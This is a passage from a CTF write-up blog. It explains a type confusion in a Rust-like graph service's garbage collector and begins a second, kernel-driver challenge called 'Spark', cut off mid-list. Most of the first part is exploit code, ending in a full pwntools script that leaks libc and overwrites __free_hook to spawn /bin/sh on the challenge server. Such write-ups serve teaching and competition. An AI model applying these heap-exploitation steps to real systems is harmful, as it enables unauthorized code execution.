</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;bin_len&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>bin_len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_int</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>bin_vals</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read</span><span class=p>(</span><span class=n>bin_len</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>new_string</span><span class=p>,</span><span class=w> </span><span class=n>len</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>encode</span><span class=p>(</span><span class=n>bin_vals</span><span class=p>,</span><span class=w> </span><span class=n>bin_len</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// NO CHECK!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>node</span><span class=p>.</span><span class=n>text_index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>add_pool</span><span class=p>(</span><span class=n>new_string</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>node</span><span class=p>.</span><span class=n>text_len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>len</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>fn</span> <span class=nf>encode</span><span class=p>(</span><span class=n>bin_vals</span><span class=p>,</span><span class=w> </span><span class=n>bin_len</span><span class=p>)</span><span class=w> </span>-&gt; <span class=p>(</span><span class=o>&amp;</span><span class=kt>str</span><span class=p>,</span><span class=w> </span><span class=kt>u64</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=n>bin_len</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// NULL == 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=no>NULL</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>..</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>(Here we skip over a lot of details which are not relevant here.) Basically the
<code>write_bin</code> function always add to the pool even if the encoding fails.</p><p>The garbage collector considers a cell free if its <code>value >> 3 == 0</code> and this
olds for NULL. Therefore we have a type confusion where we can have the same
memory referenced as a text and a node.</p><p><figure><img class="my-0 rounded-md" loading=lazy alt src=https://i.imgur.com/2GSOiz3.png></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>craft_node</span><span class=p>(</span><span class=n>_id</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Helper function to get the bytes of an arbitrary node&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;this_idx&#34;</span><span class=p>,</span> <span class=mh>0x4141414141414141</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;edges&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;last_edge&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;edges_end&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;text_len&#34;</span><span class=p>,</span> <span class=mh>0x4141414141414141</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;text_idx&#34;</span><span class=p>,</span> <span class=mh>0x4141414141414141</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>kwargs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;stamp&#34;</span><span class=p>,</span><span class=mh>0x4141414141414141</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>forge_node</span><span class=p>(</span><span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># write an empty b64 to cause the bug in the node 0</span>
</span></span><span class=line><span class=cl>    <span class=n>write_bin</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Create a new node which will be confused</span>
</span></span><span class=line><span class=cl>    <span class=c1># with the text of the node 0</span>
</span></span><span class=line><span class=cl>    <span class=n>node_id</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Create the bytes for the arbitrary node</span>
</span></span><span class=line><span class=cl>    <span class=n>crafted</span> <span class=o>=</span> <span class=n>craft</span><span class=p>(</span><span class=n>node_id</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Write it</span>
</span></span><span class=line><span class=cl>    <span class=n>write_text</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>crafted</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>node_id</span>
</span></span></code></pre></div><p>Now that we can forge arbitrary nodes we need to find a leak of the libc address
and a write primitive.</p><p>The pseudo-rust of the connect_node function is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>fn</span> <span class=nf>connect_node</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;pred_id&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>pred_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_int</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>pred_node</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>match</span><span class=w> </span><span class=n>find_node</span><span class=p>(</span><span class=n>root</span><span class=p>,</span><span class=w> </span><span class=n>pred_id</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Some</span><span class=p>(</span><span class=n>node</span><span class=p>)</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=n>node</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>None</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;invalid&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;succ_id&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>succ_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_int</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>succ_node</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>match</span><span class=w> </span><span class=n>find_node</span><span class=p>(</span><span class=n>root</span><span class=p>,</span><span class=w> </span><span class=n>succ_id</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Some</span><span class=p>(</span><span class=n>node</span><span class=p>)</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=n>node</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>None</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;invalid&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>unsafe</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>ptr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pred_node</span><span class=p>.</span><span class=n>edges</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// check if the edge was already inserted
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=n>ptr</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>pred_node</span><span class=p>.</span><span class=n>last_edge</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=n>pool</span><span class=p>[</span><span class=o>*</span><span class=n>ptr</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>succ</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=n>pred_node</span><span class=p>.</span><span class=n>last_edge</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>pred_node</span><span class=p>.</span><span class=n>edges_end</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// realloc pred_node.edges
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>            </span><span class=c1>// and fix pred_node.last_edge
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>            </span><span class=c1>// and pred_node.edges_end
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// write what where primitive
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=o>*</span><span class=n>pred_node</span><span class=p>.</span><span class=n>last_edge</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>succ_node</span><span class=p>.</span><span class=n>this_index</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>So if we can craft two arbitrary nodes, we can use <code>connect_node</code> to get
arbitrary write.</p><p>For the libc leak we can do the usual unsorted bin leak (free a chunk into the
unsorted bin, then read the pointer to the arena that will be placed in the
heap).</p><p>Here we create a node with arbitrary big <code>text_len</code> to be able to read out of
bound, then allocate and free a chunk to read the heap-metadata of the freed
chunk.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>nb</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Bug: write_bin with size 0 will return 1 instead of a pointer.</span>
</span></span><span class=line><span class=cl><span class=n>write_bin</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># This node can be overwritten with nb.text.</span>
</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Node that will be freed for the libc leak.</span>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Allocate &gt;0x400 bytes so that the chunk will skip the tcache.</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>n2</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Create another node to avoid consolidation with the top chunk.</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.</span>
</span></span><span class=line><span class=cl><span class=n>disconnect</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=n>n2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># Craft n1 so that we can read the pointers from the heap.</span>
</span></span><span class=line><span class=cl><span class=n>crafted</span> <span class=o>=</span> <span class=n>craft</span><span class=p>(</span><span class=n>n1</span><span class=p>,</span> <span class=n>text_idx</span><span class=o>=</span><span class=n>n1</span><span class=p>,</span> <span class=n>text_len</span><span class=o>=</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=n>crafted</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Leak.</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>n1</span><span class=p>)</span>
</span></span></code></pre></div><h3 class="relative group">The exploit<div id=the-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit aria-label=Anchor>#</a></span></h3><p>In the following code we will omit the primitives for simplicity sake, the
complete script can be found
<a href=https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab target=_blank>here</a>.</p><p>Now that we can leak a libc address and we have a write-what-where primitive we
can open a shell by either modifying the <code>.got.plt</code> or by overwriting one of the
hooks in the libc. We chose to overwrite the <code>__free_hook</code> since it&rsquo;s faster.</p><p>Steps to get a shell:</p><ul><li>get the leak</li><li>craft the nodes for the arbitrary write</li><li>write the address of <code>system</code> in <code>__free_hook</code></li><li>create a text with <code>/bin/sh\x00</code> and then free it</li></ul><p>The full exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/lib/x86_64-linux-gnu/libc-2.31.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;13.231.226.137&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>9573</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 1: leak libc base.</span>
</span></span><span class=line><span class=cl><span class=c1># Prepare a root node for later. In the second step the DFS will go down here first,</span>
</span></span><span class=line><span class=cl><span class=c1># so it won&#39;t crash on the nodes we crafted in the first step.</span>
</span></span><span class=line><span class=cl><span class=n>na</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Root node for step 1.</span>
</span></span><span class=line><span class=cl><span class=n>nb</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Bug: write_bin with size 0 will return 1 instead of a pointer.</span>
</span></span><span class=line><span class=cl><span class=n>write_bin</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># This node can be overwritten with nb.text.</span>
</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Node that will be freed for the libc leak.</span>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Allocate &gt;0x400 bytes so that the chunk will skip the tcache.</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>n2</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Create another node to avoid consolidation with the top chunk.</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.</span>
</span></span><span class=line><span class=cl><span class=n>disconnect</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=n>n2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># Craft n1 so that we can read the pointers from the heap.</span>
</span></span><span class=line><span class=cl><span class=n>crafted</span> <span class=o>=</span> <span class=n>craft</span><span class=p>(</span><span class=n>n1</span><span class=p>,</span> <span class=n>text_idx</span><span class=o>=</span><span class=n>n1</span><span class=p>,</span> <span class=n>text_len</span><span class=o>=</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;writing&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>crafted</span><span class=p>),</span> <span class=s1>&#39;bytes:&#39;</span><span class=p>,</span> <span class=n>crafted</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=n>crafted</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>n1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_libc</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mi>160</span><span class=p>:</span><span class=mi>160</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;leak arena:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak_libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak_offset</span> <span class=o>=</span> <span class=mi>2014176</span> <span class=c1># main_arena + 96</span>
</span></span><span class=line><span class=cl><span class=n>main_arena</span> <span class=o>=</span> <span class=mh>0x7ffff7c2cb80</span> <span class=c1># libc.symbols[&#39;main_arena&#39;]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;main_arena&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>main_arena</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;leak_offset&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak_offset</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>leak_libc</span> <span class=o>-</span> <span class=n>leak_offset</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;libc base:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 2: write what-were to get a shell.</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>what</span> <span class=o>=</span> <span class=n>system</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;system:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>where</span> <span class=o>=</span> <span class=n>free_hook</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;__free_hook:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># write_bin bug again to control a second node.</span>
</span></span><span class=line><span class=cl><span class=n>write_bin</span><span class=p>(</span><span class=n>n3</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># This node can be overwritten with n3.text.</span>
</span></span><span class=line><span class=cl><span class=n>n4</span> <span class=o>=</span> <span class=n>create</span><span class=p>(</span><span class=n>na</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Prepare nodes for arbitrary write.</span>
</span></span><span class=line><span class=cl><span class=n>wherenode</span> <span class=o>=</span> <span class=n>craft</span><span class=p>(</span><span class=n>n1</span><span class=p>,</span> <span class=n>edges</span><span class=o>=</span><span class=n>where</span><span class=o>-</span><span class=mi>8</span><span class=p>,</span> <span class=n>last_edge</span><span class=o>=</span><span class=n>where</span><span class=p>,</span> <span class=n>edges_end</span><span class=o>=</span><span class=n>where</span><span class=o>+</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>whatnode</span> <span class=o>=</span> <span class=n>craft</span><span class=p>(</span><span class=n>n4</span><span class=p>,</span> <span class=n>pool_idx</span><span class=o>=</span><span class=n>what</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>n3</span><span class=p>,</span> <span class=n>whatnode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=n>wherenode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Trigger arbitrary write.</span>
</span></span><span class=line><span class=cl><span class=n>connect</span><span class=p>(</span><span class=n>n1</span><span class=p>,</span> <span class=n>n4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Write in a chunk and trigger the free in write_text to call system(&#34;/bin/sh&#34;).</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_text</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>1500</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">Spark<div id=spark class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#spark aria-label=Anchor>#</a></span></h2><blockquote><p>Shortest Path AlgoRithm in Kernel!</p><p><code>nc 3.113.76.29 9427</code></p></blockquote><p>This challenge is a Linux VM with a custom kernel module, which exposes a new
<code>/dev/node</code> device.
The module allows building weighted graphs and calculating the shortest distance
between two nodes.</p><p>When we <code>open</code> the driver, the descriptor is backed by the following
<code>private_data</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>node</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>refcount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mutex</span> <span class=n>state_lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>is_finalized</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mutex</span> <span class=n>nb_lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>num_children</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>list_head</span> <span class=n>edges</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>traversal_idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>node_list</span> <span class=o>*</span><span class=n>traversal</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>After opening a node, we can interact via ioctl.
There are four ioctls:</p><ul><li>Link (<code>0x4008d900</code>): takes two node descriptors A and B, and a edge weight,
